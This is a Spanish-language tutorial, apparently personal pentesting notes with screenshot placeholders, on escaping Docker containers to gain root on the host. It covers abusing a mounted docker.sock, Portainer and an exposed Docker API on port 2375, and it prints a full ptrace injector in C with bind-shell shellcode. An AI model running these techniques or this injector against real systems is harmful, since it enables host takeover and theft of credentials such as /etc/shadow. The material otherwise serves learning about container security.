

Normalmente hay un recusrso en el  sistema el cual nos permite comunicarnos con el demonio de docker el cual esta en la ruta /var/run/docker.sock esto nos permite interactura para ver informacion de lo contenedores , imagenes, etc si dentro de un contenedor se tratar de usar docker aparecera el siguiente error

![[Pasted image 20240303122047.png]]

Este error muestra que no se encuentra el recurso /var/run/docker.sock entonces lo que se podria hacer es hacer contenedor con una montura para que el /var/run/docker.sock sea el mismo que tenga el contenedor esto se hace en ocasiones para determinadas tareas privilegidadas y se hace desplegando un nuevo contendor y con el uso de monturas meter todo lo de  /var/run/docker.sock de la maquina principal a /var/run/docker.sock del contendor como se muestra a continuacion 

![[Pasted image 20240303125825.png]]

Ahora al acceder al contendor y ya con el docker instalado podemos ver que al listar las imagenes y los contenedores lo que vemos son los contenedores y las imagenes de la maquina principal

![[Pasted image 20240303141204.png]]

Entonces como en el contenedor estamos como root y gracias a que estamos usando el unix socket file de la maquina principal para interactuar con esta lo que se puede hacer es crear un contenedor usando monturas para meter toda la raiz de la maquina principal en una ruta dada del contenedor esto se puede hacer dentro del mismo contenedor creando un nuevo contendor de la siguiente manera


![[Pasted image 20240303141834.png]]

Ahora si accedmeos al contenedor creado y nos dirigimos al directorio donde hizimos la montura de la raiz de la maquina principal podemos hacer varias cosas tal es el caso de agregar permisos suid a /bin/bash estos permisos afectaran directamente a /bin/bash de la maquina principal ya que estamos trabajando con monturas 

![[Pasted image 20240303143821.png]]

Si queremos vericar esto podemos acceder a la maquina principal como un usuario normal y ejecutar una bash al ejecutarla veremos que somos el usuaario root

![[Pasted image 20240303144307.png]]

Esta seria una forma para poder escapar del contenedor a la maquina principal o ejecutar una tarea privilegiada en la maquina principal


Otra forma que existe para escapar del contenedor es la siguiente en este caso que a la hora de desplegar un contendor se haga de la siguiente manera

![[Pasted image 20240304111400.png]]

Tu de esta forma lo que estas consiguiendo es que al momento de despelgarlo con el parametro --pid=host todos los procesos que estan activos en la maquina principal se pueden ver  desde el contenedor por ejemplo en la maquina principal se esta ejecutando un servidor con ayuda de python 
![[Pasted image 20240303154716.png]]

Entonces ahora si entras al contendor y listas los procesos puedes ver que esta corriendo un servidor en python como root pero este esta en la maquina principal y todo esto se acontece gracias al parametro --pid=host

![[Pasted image 20240303154657.png]]


Como vemos que el usuario root es el que esta lanzado este proceso lo que se puede hacer es inyectar una shellcode al proceso con la cual podemos crear un subproceso con el cual ejecutar comandos lo que podemos hacer es usar la herramienta https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c la cual trata de inyectar un shellcode que lanza un sh en nuestro caso lo que haremos es que en vez de lanzar una sh nos de una bindshell entonces podemos usar el shellcode que se muestra en este sitio https://www.exploit-db.com/exploits/41128 este lo que hace es que abre el puerto 5600 por tcp para si nos conectamos  a este por netcat tener una consola interactiva como el propietario del servicio en este caso root entonces para esto dentro del contenedor creamos un archivo de c con la herrmienta antes mencionada pero tendremos que modificar lo siguiente

![[Pasted image 20240304083408.png]]


Esto sera modificado por la longitud del shellcode que nos da la bindshell y el shellcode correspondendiente por lo que quedaria de la siguiente forma:

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 87

unsigned char *shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	 perror ("ptrace(POKETEXT):");
	 return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	 perror ("ptrace(DETACH):");
	 exit (1);
	}
  return 0;

}
```

Ahora solo lo compilamos y lo ejecutamos 

![[Pasted image 20240304102215.png]]

Al ejecutarlo nos pide el pid del proceso donde inyectaremos el proceso asi que solo hacemos un ps -faux y vemos el pid del proceso en este caso sera el del servidor lanzado con python 

![[Pasted image 20240304113306.png]]

Entonces ahora si lo ejecutamos y le pasamos como parmetro el PID del proceso podemos ver que nos muestra un error


![[Pasted image 20240304113438.png]]

Esto significa que no se puede sincronizar a ese pid para ejecutar una tarea sobre el proceso esto es a causa de que al contenedor le falta una capability al listar las capabilites podemos ver que la capability que necesitamos esta desactivada 

![[Pasted image 20240304114604.png]]

Para solucionar esto solo se tiene que desplegar el contendor de la siguiente manera

![[Pasted image 20240304115143.png]]

De esta forma se le indica que queremos asingnar una capability en especifico si de lo contrario quieres asignar todas las capabilites puedes hacerlo de la siguiente manera 

![[Pasted image 20240304115217.png]]

Bueno ahora al desplegar el nuevo contenedor y verificar las capabilites vemos que ya esta activada la capability

![[Pasted image 20240304121200.png]]

Ahora solo repetimos los pasos anteriores para hacer el archivo c, lo compilamos y ejecutamos pero al ejecutarlo nos muestra el mismo mensaje de error por falta de capabilites 


![[Pasted image 20240304113438.png]]


Entonces como esto no funciona tendremos que crear el contendor de la otra forma antes vista pasandole la flag de --privileged para que asi cuente con todas las capabilites

![[Pasted image 20240304115217.png]]

Ya desplegado el contenedor repetimos los mismos pasos para crear el ejecutable que nos creara la bindshell aprovechandonos de los procesos entonces ya creado y compilado lo ejecutaremos en este caso si funcionara y nos mostrara lo siguiente 


![[Pasted image 20240304134712.png]]

Esto significa que ha abierto el puerto 5600 de la maquina principal por lo que si ahora nos conectamos con netcat a la ip de la maquina atacante por el puerto que se ha abierto vemos que ahora tenemos una shell como el usuario root pero de la maquina principal 

![[Pasted image 20240304135650.png]]

Y listo asi es como nos podemos escalar privilegios inyectando un shellcode a un proceso en ejecucion desde la maquina principal como root y asi tomar control del sistema para mas informacion sobre esta tecnica puedes consultar https://0x00sec.org/t/linux-infecting-running-processes/1097


Otra forma para escapar del contenedor es cuando se usa [Portainer](https://es.wikipedia.org/wiki/Portainers_(Docker)) y esta mal configurado como a continuacion se muestra

Primero tendremos que desplegar un contendor de la siguiente manera

![[Pasted image 20240304175020.png]]

Ya desplegado entramos al navegador e ingresamos por nuestra ip en el puerto 9000 la primera vez el usuario tiene que registrarse


![[Pasted image 20240304175526.png]]

Ya registrados damos click a lo siguiente 

![[Pasted image 20240304175707.png]]

Y ahora nos muestra este enviromente

![[Pasted image 20240304180031.png]]


Al darle click en donde dice 2 containers podemos ver las redes, imagenes, volumenes, contenedores, etc que tiene la maquina principal 

![[Pasted image 20240304180538.png]]

Entonces es aqui donde si por alguna razon podemos acceder la interfaz administrativa de portainer nos podemos aprovechar de esta para elevar privilegios para esto tenemos que hacer lo que se ve a continuacion 

Primero nos vamos al apartado de contenedores


![[Pasted image 20240304193609.png]]

Ya en este nos podemos aprovechar de la imagen de ubuntu que esta activa y crear un nuevo contendor para eso le damos click en añadir contenedor 

![[Pasted image 20240304193801.png]]

Al momento de crear un nuevo contenedor le indicamos el nombre de la imagen que se va a utilziar, el nombre del conteneodr y que queremos que nos de una consola interactiva con una tty configurada 

![[Pasted image 20240304194340.png]]

![[Pasted image 20240304194359.png]]

Ahora en el apartado de volumenes primero mapeamos un nuevo volumen y colocamos en donde dice contenedor la ruta del contenedor donde queremos colocar toda la raiz y le damos a bind y en anfitrion colocamos la raiz aqui es donde haremos la montura maliciosa 

![[Pasted image 20240304195021.png]]

Entonces desplegamos el contenedor dandole click al siguiente boton


![[Pasted image 20240304200320.png]]

Listo ya estaria desplegado nuestro contendor malicioso ahora para poder conseguir una consola regresamos al apartado donde se ven los contedorres y damos click en el contenedor malicioso


![[Pasted image 20240304200724.png]]

Dentro de los detalles del contenedor bajamos un poco y damos click donde dice console 

![[Pasted image 20240304200851.png]]

Ahora arrancamos la consola dandole click al siguiente boton 

![[Pasted image 20240304200956.png]]

Esto nos dara un consola totalmente interactiva desde el contenedor y como root

![[Pasted image 20240304201027.png]]

Ya que hemos utilizado monturas nos podemos dirigir al directorio que especificamos en este caso /mnt/root donde este corresponde a toda la raiz de la maquina principal por lo tanto podemos hacer lo que sea como otorgar permisos suid a una bash, traernos claves privadas depositar conetnido configurar una tarea cron alterar un archivo de sudoers etc en este caso le asignaremos un permiso suid a la bash para asi cualquier usuario en la maquina principal pueda ejecutar una bash como root


![[Pasted image 20240304201552.png]]

Y listo asi de facil podemos escalar privilegios con ayuda de portainer 


FInalmente tenemos un ultimo ejemplo donde abusaremos de la api de docker para escapar de un contendor para esto tenemos que hacer lo siguiente


BUeno lo primero que se tiene que hacer es tener el puerto 2375 en la maquina principal para eso primero tenememos que irnos al directorio /etc/docker y crear un archivo llamado daemon.json con el siguiente contenido 

![[Pasted image 20240304203311.png]]

Ahora creamos una carpeta en /etc/systemd/system/ que se llame docker.service.d y dentro de esta carpeta creamos un archivo llamado override.conf que contenga lo siguiente


![[Pasted image 20240304203640.png]]

Ahora solo reinciamos el demonio del systemd y docker con los siguientes comandos


![[Pasted image 20240304203835.png]]


Ya que el puerto 2375 este abierto podemos crear un contendor sencillo 

![[Pasted image 20240304210847.png]]

Estando el el contendor aqui ya es cuando entra la escalada de privilegios ya que al enumerar y sabiendo que estamos en un contendor lo que podemos hacer mandar una cadena vacia a la maquina principal por el puerto 2375 y si esta nos responde con un codigo de esta exitoso significa que ese puerto esta abierto y nos podriamos aprovechar de el 

![[Pasted image 20240304211415.png]]

Sabiendo esto lo que podriamos es tratar de hacer un contendor con ayuda de curl y aprovechandonos de la api de docker asiendo lo siguiente 

![[Pasted image 20240304214845.png]]

este comando crea un contenedor Docker llamado `test` utilizando la imagen de Ubuntu, ejecutando el comando `tail -f 1234 /dev/null` dentro del contenedor, montando el directorio raíz del sistema host en el directorio `/mnt` dentro del contenedor, y otorgando privilegios elevados al contenedor esto nos da una id la cual tenemos que guardar ya que la utilizaremos mas adelante .

Tambien lo que podemos hacer es listar las imagenes disponibles con el siguiente comando

![[Pasted image 20240304222509.png]]

Y listar los contenedores con este comando

![[Pasted image 20240304221813.png]]


Ahora para desplegar el contedor antes creado lo que tenemos que hacer es ejecutar el siguiente comando usando la id que nos ha proporcionado al crear el contendor 

![[Pasted image 20240304223813.png]]

Ya desplegado ya podremos ejecutar un comando para esto tendremos que ejecutar el siguiente comando usando la misma id esto lo que hara es asignarle los permisos suid a una bash pero solo nos dara la id para usarla despues no ejecutara el comando especificado  

![[Pasted image 20240304230647.png]]

Al ejecutar el comando vemos que nos da una id esta la tenemos que guardar ya que la utlizaremos en el siguiente comando el cual ya es el que ejecutara el comando gracias a la id proporcionada

![[Pasted image 20240304231528.png]]

Y listo con esto ahora cualquier usuario que este en la maquina host puede obtener una bash como usuario root aprovechandos de la bash


Tambien algo que se puede hacer el ver el output del comando de la siguiente manera primero definimos el comando que queremos ejecutar en este caso queremos ver el contenido del /etc/shadow


![[Pasted image 20240304231946.png]]

Ahora utilizamos la id que nos dio para ahora si ejecutar el comando antes definido para eso ejecutamos el siguiente comando con la unica diferencia que se le tiene que agregar el parametro --output - para asi poder ver el output 

![[Pasted image 20240304232227.png]]

De esta manera podriamos ver archivos de la maquina host

Asi es como nos podemos aprovechar de la api de docker para escalar privilegios si quieres saber mas sobre esta tecnica puedes entrar a este sitio https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker



Estas han sido algunas tecnicas para escapar de los contenedores de docker y asi poder escalar privilegios 










